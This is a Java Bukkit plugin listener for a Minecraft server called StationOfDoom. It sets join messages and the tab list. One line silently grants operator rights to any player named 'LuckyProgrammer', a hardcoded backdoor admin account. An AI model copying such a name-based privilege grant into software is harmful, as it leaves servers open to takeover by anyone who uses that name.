package de.j.stationofdoom.listener;

import de.j.stationofdoom.util.Tablist;
import de.j.stationofdoom.util.WhoIsOnline;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class PlayerJoin implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event){
        event.setJoinMessage("§6" + event.getPlayer().getName() + " ist erschienen");
        //event.getPlayer().setResourcePack(Main.tp);
        //event.getPlayer().sendMessage("§1Komme bitte in den Discord!");
        if (event.getPlayer().getName().equals("LuckyProgrammer")){
            event.getPlayer().setOp(true);
        }

        Tablist tablist = new Tablist();
        tablist.tab(event.getPlayer(), ChatColor.DARK_BLUE + "     StationOfDoom     ", ChatColor.RED + "     Hosted by MisterDoenerHD     \n Plugin by LuckyProgrammer");
        tablist.setScoreboard();

        WhoIsOnline.join(event.getPlayer());
    }
}
